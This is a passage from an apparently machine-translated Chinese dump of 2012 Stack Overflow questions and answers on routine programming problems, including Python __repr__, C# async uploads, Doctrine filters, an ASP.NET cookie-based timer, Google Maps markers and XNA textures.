        ##stops = a list of instances of Ligne1Stop class
        self.stops = stops
    def returnAllStopsOnLigne(self):
        return self.stops 
```

当我调用方法 returnAllStopsOnLigne() 我得到一个列表

```
"<__main__.ligne1Stop instance at 0x1418828"> 
```

如何在停止列表中返回正确的类实例名称？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-17T14:51:30.000

您正在查看`repr()`类的表示输出。如果在您的自定义类上定义，`repr()`将调用[`__repr__()`钩子：](http://docs.python.org/2/reference/datamodel.html#object.__repr__)

```
def __repr__(self):
    return '<linge1Stop: name={0}>'.format(self.name) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-17T15:11:07.197

除了Martijn的回答，您可以

```
return [ s.__class__.__name__ for s in self.stops ] 
```

当然，如果您*只*对类实例名称感兴趣

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-17T19:07:04.640

为每个实例返回字符串表示的正确方法是`__repr__`在类上定义一个方法，如下所示：

```
class ligne(object):
    def __repr__(self):
        return u'<{c} name={n}>'.format(c=self.__class__.__name__, n=self.name).encode('utf-8') 
```

示例用法：

```
>>> L = ligne()
>>> L.name = u'John Smith'
>>> L
<ligne name=John Smith>
>>> 
```

`u`和的目的`encode('utf-8')`是确保当您的属性设置为 Unicode 值（例如，）`__repr__`时不会中断。这是一个常见的菜鸟错误，通常在生产之前不会被发现，这可能会让人头疼。示例用法：`name``Café Del Mar`

```
>>> type(u'Hello, World'.encode('utf-8'))
<type 'str'> 
```

另请注意，我将`object`. 不子类`object`化将导致与您想要或期望的不同的[MRO ，并且与 Python 3 不向前兼容。](http://www.python.org/download/releases/2.3/mro/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-17T15:11:58.657

根据您提供的输出，您将传入该类的单个实例`Ligne1Stop`。显然，这不会为您提供此类实例的所有“名称”。

您应该做的是在该类本身中保留该类的所有实例的列表：

```
class Ligne1Stop(object):
      allinstances = []

      def __init__(self, name, *args):
          self.allinstances.append(self)
          self.name = unicode(name)
          # rest of init 
```

要获取所有名称，您需要添加一些方法来获取名称，并定义将`__unicode__`其用作字符串表示的方法：

```
 def __unicode__(self):
          return self.name 
```

然后你可以这样做：

```
[str(instance) for instance in Ligne1Stop.allinstances] 
```

如果您愿意，可以添加方法以返回列表的单独副本`allinstances`和/或将其隐藏在属性后面。

# c# - 将uploadfile转换为uploadfileasync c#

> ID：13916359
> 
> 赞同：0
> 
> 时间：2012-12-17T14:48:50.780
> 
> 标签：c#, winforms, asynchronous

您好，我正在尝试通过 c# 将文件上传到我的网络服务器，并且在上传文件时遇到问题，我的应用程序冻结，直到文件上传完成，我想上传它异步但我似乎无法获取代码在这里工作是有代码和我不断收到的错误。

此代码有效，但冻结了表单。

```
WebClient wc = new WebClient();
wc.Credentials = new System.Net.NetworkCredential(TxtUsername.Text, TxtPassword.Text);
string Filename = TxtFilename.Text;
string Server = TxtServer.Text + SafeFileName.Text;
wc.UploadFile(Server, Filename); 
```

但是，如果我执行此代码，则会出现错误。

```
WebClient wc = new WebClient();
wc.Credentials = new System.Net.NetworkCredential(TxtUsername.Text, TxtPassword.Text);
string Filename = TxtFilename.Text;
string Server = TxtServer.Text + SafeFileName.Text;
wc.UploadFileAsync(Server, Filename); 
```

尝试使其异步时出现此错误

```
Error 1 The best overloaded method match for System.Net.WebClient.UploadFileAsync(System.Uri, string)' has some invalid arguments.
Error 2 Argument 1: cannot convert from 'string' to 'System.Uri' 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-17T14:53:39.610

换行

```
wc.UploadFileAsync(Server, Filename); 
```

至

```
wc.UploadFileAsync(new Uri(Server), Filename); 
```

`UploadFileAsync`不带字符串参数，因此您需要`Uri`从服务器地址创建一个。有关详细信息，请参阅[MSDN 文档。](http://msdn.microsoft.com/en-us/library/ms144232.aspx)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-17T14:55:23.430

正如卡米所说。此外，您可能想要处理该`UploadFileCompleted`事件。

例子：

```
wc.UploadFileCompleted += (o, args) =>
{
    //Handle completition
};
wc.UploadFileAsync(new Uri(Server), Filename); 
```

# symfony - 如何修改自动加载相关实体时使用的查询？

> ID：13916361
> 
> 赞同：0
> 
> 时间：2012-12-17T14:49:05.417
> 
> 标签：symfony, doctrine-orm

假设有一个非常基本的结构： A`Category`可以包含多个项目`Product`：

```
/**
 * @ORM\OneToMany(targetEntity="Product", mappedBy="category", cascade="remove")
 */
protected $products;

/**
 * @ORM\ManyToOne(targetEntity="Category", inversedBy="products")
 * @ORM\JoinColumn(name="product_id", referencedColumnName="id")
 */
protected $category; 
```

*当我通过这样的类别*访问它们时，我得到了所有产品：

```
$category->products; 
```

假设 a`Product`有一个属性`invisible`。如何强制 Doctrine 仅加载**可见**的产品。我把这个查询放在哪里？进入*存储库*？但是：我如何称呼它或在“全部加载”和“加载某些”之间切换？我当然可以单独要求产品，但这似乎不是一个好的解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T21:49:50.180

最简单的方法是简单地将可见性参数添加到您的 category->getProducts() 方法：

```
class Category
{
public function getProducts($invisible = false)
{
    if ($invisible) return $this->products;

    $visibleProducts = array();
    foreach($this->products as $product)
    {
        if ($product->isVisible()) $visibleProducts[] = $product;
    }
    return $visibleProducts;
} 
```

这不会阻止加载所有产品，但它确实为您提供了一种简单的方法来决定您想要哪些产品。而且它很容易实现。您可以稍后对其进行细化。

第二种方法是创建一个查询以使用产品加载所有类别。这将避免产品的延迟加载，并允许您准确指定您想要的产品。

最后，您可以按照@w1cked 的建议制作 D2 过滤器。需要一点努力来理解这个过程。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T19:40:46.103

在我看来，更好的解决方案是使用 Doctrine Filters（如果您使用的是 Doctrine 2.2 或更高版本）

[学说过滤器手册](http://docs.doctrine-project.org/en/latest/reference/filters.html)

您可以为您的不可见属性定义自定义过滤器，并随时通过实体管理器启用/禁用它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-17T15:18:26.120

一种解决方案是创建一个“visibleProduct”实体，使用单表继承（[http://docs.doctrine-project.org/en/2.0.x/reference/inheritance-mapping.html#single-table-inheritance](http://docs.doctrine-project.org/en/2.0.x/reference/inheritance-mapping.html#single-table-inheritance) ) 并从类别中建立第二个关系。

# asp.net - 如何让 cookie 与 asp.net 网络应用程序一起使用？

> ID：13916363
> 
> 赞同：6
> 
> 时间：2012-12-17T14:49:07.233
> 
> 标签：asp.net, cookies

全部。我有一点编码问题，希望你能帮助我。我正在为我的工作制作秒表计时器。我的老板想为公司制定一个程序，以帮助跟踪员工完成分配任务的时间。有人告诉我应该使用我以前从未使用过的 asp.net 来制作它。我设法让计时器在一定程度上工作，它完成了除了保存会话之外的所有工作。我需要做的最后一件事是，如果用户关闭窗口或重新加载页面，计时器仍然在滴答作响。我认为最好的方法是使用 cookie。视图状态本身工作正常，只是它在重新加载时不保存计时器值。如果我在选项卡中打开一个新页面，它就会重新开始。我发现了如何制作饼干，但我不相信我用对了。

这是 aspx 代码（我有一些 javascript 在那里，因为我试图了解以这种方式实现计时器，以便它更准确，所以请忽略它）：

```
<%@ Page Title="Home Page" Language="C#" MasterPageFile="~/Site.master" AutoEventWireup="true" CodeFile="Default.aspx.cs" Inherits="NerdcoreTimer._Default" %>

<asp:Content ID="HeaderContent" runat="server" ContentPlaceHolderID="HeadContent">
 <script type="text/javascript">
   var seconds = 0;
   var minutes = 0;
   var hours = 0;
   var tick;

  function stopCount() {
    clearTimeout(t);
  }

function startCount() {
    document.getElementById('seconds').innerHTML = seconds;
    document.getElementById('minutes').innerHTML = minutes;
    document.getElementById('hours').innerHTML = hours;
    seconds = seconds + 1;
    if (seconds == 60) {
        seconds = 0;
        minutes = minutes + 1;
    }
    if (minutes == 60) {
        minutes = 0;
        hours = hours + 1;
    }
    tick = setTimeout("startCount()", 1000)
}

function reset() {
    seconds = 0;
    minutes = 0;
    hours = 0;
    document.getElementById('seconds').innerHTML = seconds;
    document.getElementById('minutes').innerHTML = minutes;
    document.getElementById('hours').innerHTML = hours;
}

function startTimer() { return $find('Timer1')._startTimer(); }
function stopTimer() { return $find('Timer1')._stopTimer(); }
</script> 
```

```
<asp:ScriptManager ID="ScriptManager1" runat="server"></asp:ScriptManager>

<div>
    <table align="center">
        <tr>
            <td>
                <asp:DropDownList ID="Tasks" runat="server" Width="75px">
                    <asp:ListItem>Task 1</asp:ListItem>
                    <asp:ListItem>Task 2</asp:ListItem>
                    <asp:ListItem>Task 3</asp:ListItem>
                    <asp:ListItem>Task 4</asp:ListItem>
                    <asp:ListItem>Task 5</asp:ListItem>
                    <asp:ListItem>Task 6</asp:ListItem>
                </asp:DropDownList>
            </td>
            <td style="text-align:center">
                <asp:UpdatePanel ID="UpdatePanel1" runat="server">
                    <ContentTemplate>
                        <asp:Timer ID="Timer1" runat="server" Enabled="false" Interval="879" OnTick="Timer1_Tick"></asp:Timer>
                        <asp:Label ID="hour2" runat="server" Text="0"></asp:Label>
                        <asp:Label ID="hour1" runat="server" Text="0"></asp:Label>
                        <asp:Label ID="colon1" runat="server" Text=":"></asp:Label>
                        <asp:Label ID="min2" runat="server" Text="0"></asp:Label>
                        <asp:Label ID="min1" runat="server" Text="0"></asp:Label>
                        <asp:Label ID="colon2" runat="server" Text=":"></asp:Label>
                        <asp:Label ID="sec2" runat="server" Text="0"></asp:Label>
                        <asp:Label ID="sec1" runat="server" Text="0"></asp:Label>
                    </ContentTemplate>
                </asp:UpdatePanel>
            </td>
            <td>
                <asp:Button ID="Start" runat="server" OnClientClick="startTimer()" Text="Start" Width="75px" OnClick="Start_Click" />
            </td>
        </tr>
        <tr>
            <td>&nbsp;</td>
            <td>
                <asp:Button ID="Stop" runat="server" OnClientClick="stopTimer()" Text="Stop" Width="75px" OnClick="Stop_Click" />
                <asp:Button ID="Reset" runat="server"  Text="Reset" Width="75px" OnClick="Reset_Click" />
            </td>
        </tr>
    </table>
</div>
&nbsp
<div>
    <table align="center">
        <tr>
            <td style="text-align:center">
            <asp:UpdatePanel ID="UpdatePanel2" runat="server">
                    <ContentTemplate>
                        <asp:Label ID="startDate" runat="server" Text="Start Date: "></asp:Label>
                        <asp:Label ID="startTime" runat="server" Text=""></asp:Label>
                        <hr />
                        <asp:Label ID="stopDate" runat="server" Text="Stop Date: "></asp:Label>
                        <asp:Label ID="stopTime" runat="server" Text=""></asp:Label>
                        <hr />
                    </ContentTemplate>
                </asp:UpdatePanel>
            </td>
        </tr>
    </table>
</div>
&nbsp
<div>
    <table align="center">
        <tr>
            <td style="text-align:center">
            <asp:UpdatePanel ID="UpdatePanel3" runat="server">
                <ContentTemplate>
                        <asp:Label ID="hours" runat="server" ></asp:Label>
                        <asp:Label ID="minutes" runat="server" ></asp:Label>
                        <asp:Label ID="seconds" runat="server" ></asp:Label>
                </ContentTemplate>
            </asp:UpdatePanel>
            </td>
            <td>
            <asp:UpdatePanel ID="UpdatePanel4" runat="server">
                <ContentTemplate>
                    <asp:Button ID="Button1" runat="server" OnClientClick="startCount()" Text="Start" Width="75px"/>
                </ContentTemplate>
            </asp:UpdatePanel>
            </td>
        </tr>
        <tr>
            <td>&nbsp;</td>
            <td>
            <asp:UpdatePanel ID="UpdatePanel5" runat="server">
                <ContentTemplate>
                    <asp:Button ID="Button2" runat="server" OnClientClick="stopCount()" Text="Stop" Width="75px"/>
                    <asp:Button ID="Button3" runat="server" OnClientClick="reset()" Text="Reset" Width="75px"/>
                </ContentTemplate>
            </asp:UpdatePanel>
            </td>
        </tr>
    </table>
</div> 
```

这是 C# 中文件背后的代码：

```
 using System;
 using System.Data.SqlClient;
 using System.Configuration;
 using System.Collections.Generic;
 using System.Linq;
 using System.Web;
 using System.Web.UI;
 using System.Web.UI.WebControls;
 using System.Timers;

 namespace NerdcoreTimer
 {
  public partial class _Default : System.Web.UI.Page
  {
    public int time_sec;
    public int time_min;
    public int time_hour;
    public string start;
    public string stop;

    HttpCookie cookieStartDate = new HttpCookie("startDate");
    HttpCookie cookieTask = new HttpCookie("task");
    HttpCookie cookieSec = new HttpCookie("seconds");
    HttpCookie cookieMin = new HttpCookie("minutes");
    HttpCookie cookieHr = new HttpCookie("hours");
    HttpCookie cookieStopDate = new HttpCookie("stopDate");

    //SQL connection string
    System.Data.SqlClient.SqlConnection sqlConnection1 =
    new System.Data.SqlClient.SqlConnection("Server=*****;Database=*****;User Id=*****;Password=*****;");

    protected void Page_Load(object sender, EventArgs e)
    {
        //Check to see if there are cookies
        if (Request.QueryString["startDate"] != null)
        {
            ReadCookie_StartDate();
        }
        if ((Request.QueryString["seconds"] != null) && (Request.QueryString["minutes"] != null) && (Request.QueryString["hours"] != null))
        {
            ReadCookie_Timer();
            //If the cookie values for seconds, minutes, and hours is not null, enable the timer and disable and enable the proper controls
            Timer1.Enabled = true;
            Stop.Enabled = true;

            Start.Enabled = false;
            Tasks.Enabled = false;
        }
        if (Request.QueryString["stopDate"] != null)
        {
            ReadCookie_StopDate();
        }

        //Open the sql connection
        sqlConnection1.Open();

        //Disable these controls on page load
        Stop.Enabled = false;
        Reset.Enabled = false;

        //Make sure the timer is disabled if starting a new session
        if (!IsPostBack)
        {
            Timer1.Enabled = false;
        }
    }

    protected void ReadCookie_StartDate()
    {
        //Get the cookie names
        String strCookieStart = Request.QueryString["startDate"].ToString();
        String strCookieTask = Request.QueryString["task"].ToString();

        //Grab the cookies
        HttpCookie cookieStart = Request.Cookies[strCookieStart];
        HttpCookie cookieTask = Request.Cookies[strCookieTask];

        //Check to make sure the cookies exist
        if ((cookieStart != null)&&(cookieTask != null))
        {
            String strCookieStartValue = cookieStart.Value.ToString();
            startTime.Text = strCookieStartValue;
            String strCookieTaskValue = cookieTask.Value.ToString();
            Tasks.SelectedValue = strCookieTaskValue;
        }
    }

    protected void ReadCookie_Timer()
    {
        //Get the cookie names
        String strCookieSec = Request.QueryString["seconds"].ToString();
        String strCookieMin = Request.QueryString["minutes"].ToString();
        String strCookieHr = Request.QueryString["hours"].ToString();

        //Grab the cookies
        HttpCookie cookieSec = Request.Cookies[strCookieSec];
        HttpCookie cookieMin = Request.Cookies[strCookieMin];
        HttpCookie cookieHr = Request.Cookies[strCookieHr];

        //Check to make sure the cookies exist
        if ((cookieSec != null)&&(cookieMin != null)&&(cookieHr != null))
        {
            String strCookieSecValue = cookieSec.Value.ToString();
            String strCookieMinValue = cookieMin.Value.ToString();
            String strCookieHrValue = cookieHr.Value.ToString();
            sec1.Text = strCookieSecValue;
            min1.Text = strCookieMinValue;
            hour1.Text = strCookieHrValue;
        }
    }

    protected void ReadCookie_StopDate()
    {
        //Get the cookie name
        String strCookieStop = Request.QueryString["stopDate"].ToString();

        //Grab the cookie
        HttpCookie cookieStop = Request.Cookies[strCookieStop];

        //Check to make sure the cookie exists
        if (cookieStop != null)
        {
            String strCookieStopValue = cookieStop.Value.ToString();
            stopTime.Text = strCookieStopValue;
        }
    }

    protected void Start_Click(object sender, EventArgs e)
    {
        //Start the timer
        Timer1.Enabled = true;

        //Get the start date
        start = DateTime.Now.ToString();
        if (startTime.Text == "")
        {
            startTime.Text = start;
        }

        //Store the start date in a cookie
        Start_Session();

        //Enable these controls
        Stop.Enabled = true;

        //Disable these controls
        Start.Enabled = false;
        Tasks.Enabled = false;
        Reset.Enabled = false;
    }

    protected void Timer1_Tick(object sender, EventArgs e)
    {
        //Add to the sec1 label
        time_sec = int.Parse(sec1.Text);
        time_sec = time_sec + 1;
        sec1.Text = time_sec.ToString();

        //Hide the sec2 label
        if (sec1.Text == "10")
        {
            sec2.Visible = false;
        }

        //Add to the min1 label
        if (sec1.Text == "60")
        {
            sec2.Visible = true;
            time_min = int.Parse(min1.Text);
            sec1.Text = "0";
            time_min = time_min + 1;
            min1.Text = time_min.ToString();
        }

        //Hide the min1 label
        if (min1.Text == "10")
        {
            min2.Visible = false;
        }

        //Add to the hour1 label
        if (min1.Text == "60")
        {
            min2.Visible = true;
            time_hour = int.Parse(hour1.Text);
            min1.Text = "0";
            time_hour = time_hour + 1;
            hour1.Text = time_hour.ToString();
        }

        //Hide the hour2 label
        if (hour1.Text == "10")
        {
            hour2.Visible = false;
        }

        //Store the sec1, min1, and hour1 values into cookies
        TimerTick_Session();
    }

    protected void Stop_Click(object sender, EventArgs e)
    {
        //Get the stop date
        stop = DateTime.Now.ToString();
        stopTime.Text = stop;

        //Store the stop date in a cookie
        Stop_Session();

        //Disable the timer and this control
        Timer1.Enabled = false;
        Stop.Enabled = false;

        //Enable these controls
        Start.Enabled = true;
        Reset.Enabled = true;

        //Store the selected task, start date, stop date and totalTime
        string tsk = Tasks.SelectedValue;
        string dateStart = startTime.Text;
        string dateStop = stopTime.Text;

        //Create a sql query string
        string sqlString = "INSERT TimeSheet (Task,DateStart,DateStop) VALUES (@Task,@DateStart,@DateStop)";

        //Create a sql command using the query string
        System.Data.SqlClient.SqlCommand cmd = new System.Data.SqlClient.SqlCommand(sqlString);

        //Add the selected task value, start date value, stop date and totalTime values to the query
        cmd.Parameters.AddWithValue("@Task", tsk);
        cmd.Parameters.AddWithValue("@DateStart", dateStart);
        cmd.Parameters.AddWithValue("@DateStop", dateStop);

        //Give the sql command a connection string
        cmd.Connection = sqlConnection1;

        //Execute the sql command
        cmd.ExecuteNonQuery();

        //Close the sql connection
        sqlConnection1.Close();
    }

    protected void Reset_Click(object sender, EventArgs e)
    {
        //Clear the start and stop date labels
        startTime.Text = "";
        stopTime.Text = "";

        //Reset these counters
        time_sec = 0;
        time_min = 0;
        time_hour = 0;

        //Reset the timer labels
        sec1.Text = "0";
        min1.Text = "0";
        hour1.Text = "0";

        //Make visible these timer labels
        sec2.Visible = true;
        min2.Visible = true;
        hour2.Visible = true;

        //Disable the timer and these controls
        Timer1.Enabled = false;
        Reset.Enabled = false;
        Stop.Enabled = false;

        //Enable these controls
        Start.Enabled = true;
        Tasks.Enabled = true;
    }

    protected void Start_Session()
    {
        //Create a new cookie for the start date and selected task
        //HttpCookie cookieStartDate = new HttpCookie("startDate");
        //HttpCookie cookieTask = new HttpCookie("task");

        //Set the cookie values
        cookieStartDate.Value = start;
        cookieTask.Value = Tasks.SelectedValue;

        //Set the cookie to expire in about 8 hours
        DateTime startDateExp = DateTime.Now;
        TimeSpan startDateExpMin = new TimeSpan(0, 500, 0);
        cookieStartDate.Expires = startDateExp + startDateExpMin;
        DateTime taskExp = DateTime.Now;
        TimeSpan taskExpMin = new TimeSpan(0, 500, 0);
        cookieTask.Expires = taskExp + taskExpMin;

        //Add the cookie
        Response.Cookies.Add(cookieStartDate);
        Response.Cookies.Add(cookieTask);
    }

    protected void TimerTick_Session()
    {
        //Create a new cookies for the timer
        /*HttpCookie cookieSec = new HttpCookie("seconds");
        HttpCookie cookieMin = new HttpCookie("minutes");
        HttpCookie cookieHr = new HttpCookie("hours");*/

        //Set the cookie values
        cookieSec.Value = sec1.Text;
        cookieMin.Value = min1.Text;
        cookieHr.Value = hour1.Text;

        //Set the cookies to expire in about 8 hours
        DateTime secExp = DateTime.Now;
        TimeSpan secExpMin = new TimeSpan(0, 500, 0);
        cookieSec.Expires = secExp + secExpMin;
        DateTime minExp = DateTime.Now;
        TimeSpan minExpMin = new TimeSpan(0, 500, 0);
        cookieMin.Expires = minExp + minExpMin;
        DateTime hrExp = DateTime.Now;
        TimeSpan hrExpMin = new TimeSpan(0, 500, 0);
        cookieHr.Expires = hrExp + hrExpMin;

        //Add the cookies
        Response.Cookies.Add(cookieSec);
        Response.Cookies.Add(cookieMin);
        Response.Cookies.Add(cookieHr);
    }

    protected void Stop_Session()
    {
        //Create a new cookie for the stop date
        //HttpCookie cookieStopDate = new HttpCookie("stopDate");

        //Set the cookie value
        cookieStopDate.Value = stop;

        //Set the cookie to expire in about 8 hours
        DateTime stopDateExp = DateTime.Now;
        TimeSpan stopDateExpMin = new TimeSpan(0, 500, 0);
        cookieStopDate.Expires = stopDateExp + stopDateExpMin;

        //Add the cookie
        Response.Cookies.Add(cookieStopDate);
        }
    }
} 
```

任何帮助获取此代码以保存会话状态将不胜感激。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-28T13:56:31.093

我也想快速评论一下数据库处理，因为您可能需要考虑从表示层中抽象出数据层，换句话说，考虑为数据处理创建一个单独的项目或类，而不是在同一个地方做所有事情。

此外，您可能已经发现，但 View State 在回发之间保留页面状态，因为它在页面上存储会话信息，但如果重新加载，则不再有视图状态。

除此之外，我的道歉我读得很快，但似乎你正在尝试重写微软会话处理，寻找 asp.net 会话处理。

这些是我的 2 美分。

# html - 各种控件上的 HttpPost

> ID：13916369
> 
> 赞同：0
> 
> 时间：2012-12-17T14:49:20.457
> 
> 标签：html, razor, asp.net-mvc-4

我只是在使用 Razor 学习 ASP.NET-MVC，一切都很好，我喜欢它，但我偶然发现了一个问题，我认为这是我缺乏良好的旧 HTML 知识的结果：

在良好的旧 ASP.NET 中，如果您添加了`runat="server"`. 但在 Razor 中，执行 Post-Event 的唯一方法是，正如我所假设的，表单中的提交按钮：

```
<form>
<input type="submit" value="click me" />
</form> 
```

也许在 onclick 事件中有一个明确的 ajax 帖子？稍后会尝试这个..但我想我在这里遗漏了一些东西。我可以在没有表格的情况下发送带有锚点、图像或简单按钮的帖子吗？

提前谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T14:55:50.277

HTTP 主要使用不同的动词进行通信，`GET`并且`POST`是最常见的。

在 Web 窗体中工作的原因`runat="server"`是因为 ASP.NET 将大部分页面包装在一个`<form>`标记中，并且提交的默认浏览器操作`<form>`是 via `POST`。好吧，至少这是它的要点。

如果您想执行`HTTP POST`，您要么必须使用`<form>`本机，要么设置 AJAX 调用来执行此操作，并使其`HTTP POST`像您提到的那样将请求备份为 an 。

# eclipse - Eclipse + JSP (Tomcat) - 如何从 IDE 高效运行/调试 servlet？

> ID：13916370
> 
> 赞同：0
> 
> 时间：2012-12-17T14:49:23.157
> 
> 标签：eclipse, jsp, tomcat

> **可能重复：**
> [将tomcat和eclipse集成为热部署环境](https://stackoverflow.com/questions/998737/integrating-tomcat-and-eclipse-as-a-hot-deploy-environment)

我尝试在 Eclipse 中使用 Tomcat 做一个 Web 项目。

在 IDE 中，我可以在 JSP 文件上使用 Run，在这种情况下，它会启动服务器并运行将 url 设置为 JSP 文件的 Web 浏览器。到目前为止很好，因为 JSP 文件确实部署到了服务器。

但是，我的 JSP 文件使用了一些 JAVA 文件。当我编辑 JAVA 文件并在 Eclipse 中使用 Run 时，它会打开包含 JAVA 文件路径的 web url，这实际上是无效的 URL，因为 JAVA 文件被编译为类，实际上并没有以其原始形式出现在 web 上.

问题：在开发 Web 项目并尝试运行或调试某些东西（除了 jsp 文件）时，如何配置 Eclipse 运行/调试命令以打开固定 URL（例如我的起始页）。

我尝试提高生产力，这将允许我编辑一些（java）文件并对其进行调试，而无需切换到 IDE 中的其他文件即可开始调试。

谢谢

**编辑**

我需要补充一点，我的 java 文件不是真正的 servlet（不继承 HttpServlet），而是 JSP 标签中使用的一段 Java。

无论如何，问题仍然存在并且可能会扩展：是否可以定义从 Eclipse 运行 Web 应用程序的入口点，并可能指定 URL 获取/发布参数（当使用 Eclipse 的运行/调试命令时）？

# javascript - Google Maps Api Marker setOptions() 更改图标

> ID：13916371
> 
> 赞同：2
> 
> 时间：2012-12-17T14:49:23.010
> 
> 标签：javascript, google-maps-api-3

当被绘制的多边形选中时，我想更改标记图标。在 addMarker() 中，标记从 JSON 数据中解析并推送到 allMarkers 数组中。图标未选中时为红色，选中时变为白色。

```
function addMarker(lat,lng,i){
    var myLatlng = new google.maps.LatLng(lat,lng);
    var marker = new google.maps.Marker({
        position: myLatlng,
        icon: "http://labs.google.com/ridefinder/images/mm_20_red.png",
        map: map
    });
    marker.shapeId = '0';
    allMarkers.push(marker);    
}   

function selectMarkersInPoly() {
    alert(allMarkers.length)
    for (var i=0; i < createdShapes.length; i++) {
        for (var j=0; j < allMarkers.length; j++){
            var latlong = allMarkers[j].getPosition();
            if(google.maps.geometry.poly.containsLocation(latlong, createdShapes[i]) == true) {
                allMarkers[j].shapeId = createdShapes[i].id;
                allMarkers[j].setOptions({
                    icon : "http://labs.google.com/ridefinder/images/mm_20_white.png"
                });
            }
        }
    }   

} 
```

selectMarkersInPoly() 有什么问题？？？谢谢您的帮助？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-17T15:42:34.673

这不是 javascript 匿名对象的正确语法：

```
allMarkers[j].setOptions({
                icon = "http://labs.google.com/ridefinder/images/mm_20_white.png"
            }); 
```

（我认为您会在 javascript 控制台中收到 javascript 错误）这应该可以：

```
allMarkers[j].setOptions({
                icon: "http://labs.google.com/ridefinder/images/mm_20_white.png"
            }); 
```

# javascript - 刷新 html 页面中的 div (web2py)

> ID：13916373
> 
> 赞同：0
> 
> 时间：2012-12-17T14:49:29.907
> 
> 标签：javascript, jquery, web2py

嗨，我开始使用 web2py。我有一个带有 div: 的页面 web Test.html 。另一方面，我在同一文件夹中有一个网页网页：Test2.html，其中包含一些 Python 代码：

```
{{items = ['a', 'b', 'c']}}
{{i=1}}
<table>
{{for item in items:}} 
    <tr>
        <td></br>SOME CONTENT</td>
    </tr>
{{i=i+1}}
{{pass}}
</table> 
```

如何将 Test2.html 内容放入 div IDtest 中？有什么例子吗？谢谢。目标是学习如何在 IDtest 中插入动态表。我的意思是，我会在按下按钮后刷新 IDtest 内容......

最后一次测试：我已经测试过了

```
<script src="{{=URL('static', 'js/jquery.js')}}" type="text/javascript"></script> ... and then <script type="text/javascript">jQuery(document).ready(function() { setInterval(function() {var url ='{{=URL('Test2.html')}}'; jQuery('#IDtest').load(url);alert("HELLO");}, 5000); }); I can see the HELLO evrey 5 seconds but nothing in div... any sugestions? 
```

我可以每 5 秒看到一次 HELLO，但没有发生与 div 相关的任何事情......似乎负载不起作用......有什么解决方案吗？我在网上读到负载在服务器端工作，但我不知道如何在 web2py 中翻译它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T14:54:57.070

期望您已加载 Jquery 库：

```
$('#IDtest').load('Test2.html'); 
```

# c# - XNA SourceRectangle 没有在我想要的位置绘制纹理

> ID：13916374
> 
> 赞同：1
> 
> 时间：2012-12-17T14:49:31.297
> 
> 标签：c#, xna, transparency, texture2d, rectangles

我遇到过 XNA 的情况，`sourceRectangle`即它如何在屏幕上显示纹理的一部分。

假设我有 2 个简单的形状纹理 - 一个正方形和一个圆形。圆圈位于正方形内部。圆的位置由 Mathhelper.Lerp（在正方形内，在正方形外，浮点 x）驱动。如果圆形纹理往下走，它会到达正方形的底部边缘并逐渐消失，就像到达实际游戏屏幕的底部边缘一样。`sourceRectangle`在这种情况下工作正常。

当圆圈上升并到达正方形的顶部边缘时，就会出现问题。假设圆形纹理位于正方形顶部边缘的中间。在这种情况下，我只想显示圆圈的下半部分。当我告诉`sourceRectangle`只绘制下半部分时，`sourceRectangle`会绘制下半部分，**但**它会在圆形纹理的上半部分重新绘制该部分。结果，我将圆的下半部分绘制在正方形的上边缘上方，这不是预期的效果。

我得出的结论 sourcerectangle 确实占用了您想要绘制的纹理区域，但首先在纹理顶部绘制（或定位）您想要的区域。sourcerect（在这种情况下）是否有从底部开始绘制的解决方法，或任何其他选项？

我已经尝试过 Texture2d.SetData 路由来使像素行透明。那行得通，但是我必须将 graphicsdevice[0] 设置为 null，而且我不知道如何取回该纹理（或使其再次显示在屏幕上）。每次 Lerp 将纹理推过正方形的顶部边缘时，我都尝试将纹理重新定位在正方形顶部边缘的正下方，但动画会变得“看起来很不稳定”。

[手绘 Sourcerect 描述链接](http://www.breadmachinehq.com/wp-content/uploads/2012/12/CIMG0019.jpg)

**解决**

我想出了一个非常适合我需求的解决方案。在我原来的帖子中，我说过我尝试`Texture2d.SetData()/GetData()`使正方形边界之外的像素透明。它一直有效，直到我收到一条错误消息，说我必须在设置纹理数据之前将 graphicsdevice 设置为 null。与此同时，我重新审视了它，它现在运行良好。

我的解决方案/错误：

```
Texture2D tempTex;

public Texture2d FormatTexture( Texture2D circleTex, int numOfRows)
{
    tempTex = new Texture2d(GraphicsDevice, circleTexture.Width, circleTexture.Height)

    //Each index in pixels[] will hold Color(r,g,b) data
    Color[] pixels = new Color[circleTex.Width * circleTex.Height];

    //Get every pixel's color info from the circle texture and store it in pixels[]
    circleTex.GetData<Color>(pixels);

    //Only edit the desired number of rows in the texture, not the entire texture
    for(int i = 0; i < circleTex.Width * numOfRows; i++)
    {
      //make pixel transparent via multiplying it by 0
      pixels[i] = pixels[i] * 0; 
    }

    //Bypass that graphicsdevice[0] = null error by setting data on a texture not  
    //currently using spritebatch (tempTex instead of circleTex)
    tempTex.SetData<Color>(pixels);
    return tempTex;
} 
```

我之前做错的是试图设置`circleTexture`数据。显然，当它仍在图形设备上时，您不能这样做。相反，我创建了一个不在 spritebatch“tempTex”上的新纹理，它基本上`circleTexture`是透明的行。我在`T2D.SetData`这里注意到了类似的错误帖子，但直到现在我才找到可以理解的解决方案。

# c# - BackgroundTask 每分钟 Windows Store App (C#)

> ID：13916376
> 
> 赞同：0
> 
> 时间：2012-12-17T14:49:40.247
> 
> 标签：c#, windows, intervals

因此，在通过互联网进行大量搜索并反复试验后，我在 W8 应用程序中构建了一个 backgroundTask。但显然 windows BackgroundTask 类只允许你有 15 分钟的间隔。

虽然对于我正在开发的应用程序来说这是无用的。我需要最多 1 分钟的间隔。有谁知道在应用程序暂停的最大间隔为 1 分钟的情况下运行后台任务的可行解决方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T14:57:52.897

